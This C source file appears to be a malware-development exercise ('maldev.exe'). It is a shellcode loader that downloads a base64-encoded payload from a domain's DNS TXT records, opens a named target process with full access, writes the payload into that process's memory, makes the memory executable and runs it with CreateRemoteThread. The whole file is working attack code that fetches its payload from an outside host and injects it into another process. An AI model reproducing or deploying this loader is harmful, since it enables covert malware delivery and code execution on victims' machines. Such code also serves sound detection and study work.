#include <Windows.h>
#include <Windns.h>
#include <Wincrypt.h> 
#include <stdio.h>
#include <Tlhelp32.h>

#pragma comment(lib, "Dnsapi.lib")  
#pragma comment(lib, "Crypt32.lib")

BOOL GetPayloadFromDnsTxt(LPCWSTR szDomain, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    PDNS_RECORDW pDnsRecord = NULL;
    DNS_STATUS status;

    status = DnsQuery_W(szDomain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, NULL, &pDnsRecord, NULL);
    if (status != 0) {
        printf("DnsQuery_W Failed With Error : %d\n", status);
        return FALSE;
    }
    DWORD dwTotalTextLength = 0;
    PDNS_RECORDW pCurrentRecord = pDnsRecord;

    while (pCurrentRecord != NULL) {
        if (pCurrentRecord->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < pCurrentRecord->Data.TXT.dwStringCount; i++) {
                dwTotalTextLength += lstrlenW(pCurrentRecord->Data.TXT.pStringArray[i]);
            }
        }
        pCurrentRecord = pCurrentRecord->pNext;
    }
    LPSTR szBase64Payload = (LPSTR)LocalAlloc(LPTR, dwTotalTextLength + 1);
    if (szBase64Payload == NULL) {
        DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        return FALSE;
    }

    pCurrentRecord = pDnsRecord;
    DWORD dwOffset = 0;
    while (pCurrentRecord != NULL) {
        if (pCurrentRecord->wType == DNS_TYPE_TEXT) {
            for (DWORD i = 0; i < pCurrentRecord->Data.TXT.dwStringCount; i++) {
                DWORD dwLen = lstrlenW(pCurrentRecord->Data.TXT.pStringArray[i]);
                sprintf_s(szBase64Payload + dwOffset, dwTotalTextLength + 1 - dwOffset, "%ls", pCurrentRecord->Data.TXT.pStringArray[i]);
                dwOffset += dwLen;
            }
        }
        pCurrentRecord = pCurrentRecord->pNext;
    }

    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);


    DWORD dwDecodedSize = 0;
	// find the size of the decoded payload
    if (!CryptStringToBinaryA(szBase64Payload, 0, CRYPT_STRING_BASE64, NULL, &dwDecodedSize, NULL, NULL)) {
        printf("CryptStringToBinaryA (Size Calculation) Failed : %d\n", GetLastError());
        LocalFree(szBase64Payload);
        return FALSE;
    }
	printf("Total Base64 Payload Length: %d, Decoded Payload Size: %d\n", dwTotalTextLength, dwDecodedSize);

    PBYTE pDecodedBytes = (PBYTE)LocalAlloc(LPTR, dwDecodedSize);
    if (pDecodedBytes == NULL) {
        LocalFree(szBase64Payload);
        return FALSE;
    }
    printf("Allocated %d bytes for the decoded payload\n", dwDecodedSize);

    // decode
    if (!CryptStringToBinaryA(szBase64Payload, 0, CRYPT_STRING_BASE64, pDecodedBytes, &dwDecodedSize, NULL, NULL)) {
        printf("[!] CryptStringToBinaryA (Decoding) Failed : %d\n", GetLastError());
        LocalFree(pDecodedBytes);
        LocalFree(szBase64Payload);
        return FALSE;
    }
	printf("Successfully decoded the payload, Press <Enter> to continue\n");

    LocalFree(szBase64Payload);

	// add the decoded bytes to the output parameters
    *pPayloadBytes = pDecodedBytes;
    *sPayloadSize = (SIZE_T)dwDecodedSize;

    return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

    HANDLE hSnapShot = NULL;

    // Create a snapshot of all processes in the system
    hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    PROCESSENTRY32	Proc = {
    .dwSize = sizeof(PROCESSENTRY32)
    };

    if (hSnapShot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("created a snapshot using CreateToolhelp32Snapshot\n");

    // Iterate through the snapshot to find the process with the specified name
    while (Process32Next(hSnapShot, &Proc)) {
        if (wcscmp(Proc.szExeFile, szProcessName) == 0) {

            printf("Process \"%ls\" found with PID: %d \n", szProcessName, Proc.th32ProcessID);

            *dwProcessId = Proc.th32ProcessID;
            *hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);

            if (*hProcess == NULL) {
                printf("OpenProcess Failed With Error : %d \n", GetLastError());
                CloseHandle(hSnapShot);
                return FALSE;
            }
            CloseHandle(hSnapShot);
            return TRUE; // Process found and handle obtained
        }
    }
    CloseHandle(hSnapShot); // Clean up the snapshot handle
    printf("Process \"%ls\" not found.\n", szProcessName);
    return FALSE; // Process not found
}

BOOL InjectShellcodeToRemoteProcess(IN HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeofShellcode) {

    DWORD	dwOldProtection = NULL;
    PVOID	pShellcodeAddress = NULL;
    SIZE_T	sNumberOfBytesWritten = NULL;

    pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sSizeofShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("VirtualAllocEx Failed With Error : %d \n", GetLastError());
    }



    printf("pAddress Allocated At : 0x%p using VirtualAllocEx Of Size : %d with RW permissions\n", pShellcodeAddress, sSizeofShellcode);
    printf("Press <Enter> To Write ... ");
    getchar();





    if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sSizeofShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeofShellcode) {
        printf("WriteProcessMemory Failed With Error : %d \n", GetLastError());
    }


    if (!VirtualProtectEx(hProcess, pShellcodeAddress, sSizeofShellcode, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
        return FALSE;
    }
    printf("Successfully written %d bytes, Press <Enter>\n", sNumberOfBytesWritten);
    getchar();



    printf("Executing the shellcode in the remote process using CreateRemoteThread\n");
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pShellcodeAddress, NULL, 0, NULL);	if (hThread == NULL) {
        printf("CreateRemoteThread Failed With Error : %d \n", GetLastError());
    }
    printf("Thread ID: %lu\n", GetThreadId(hThread));
    printf("DONE !\n");
    if (hThread) {
        CloseHandle(hThread);
    }

}


int wmain(int argc, wchar_t* argv[]) {
    if (argc < 3) {
        printf("Usage: maldev.exe <DomainName> <TargetProcessName>\n");
        return -1;
    }
 

    HANDLE hProcess = NULL;
    DWORD dwProcessId = 0;
    PBYTE pPayloadBytes = NULL;
    SIZE_T sPayloadSize = 0;

    // 1. Obtenir le Handle distant
    if (!GetRemoteProcessHandle(argv[2], &dwProcessId, &hProcess)) {
        printf("Failed to initialize remote process context.\n");
        return -1;
    }


    printf("Querying DNS TXT records...\n");
    if (!GetPayloadFromDnsTxt(argv[1], &pPayloadBytes, &sPayloadSize)) {
        printf("DNS payload collection failed.\n");
        CloseHandle(hProcess);
        return -1;
    }
    printf("Payload recovered from DNS (%zu bytes).\n", sPayloadSize);


    if (!InjectShellcodeToRemoteProcess(hProcess, pPayloadBytes, sPayloadSize)) {
        printf("shellcode execution failed.\n");
        if (pPayloadBytes) LocalFree(pPayloadBytes);
        CloseHandle(hProcess);
        return -1;
    }

    // Nettoyage de notre tampon local
    if (pPayloadBytes) {
        LocalFree(pPayloadBytes);
    }

    printf("[+] Done! Press <Enter> to quit.\n");
    getchar();

    CloseHandle(hProcess);
    return 0;
}

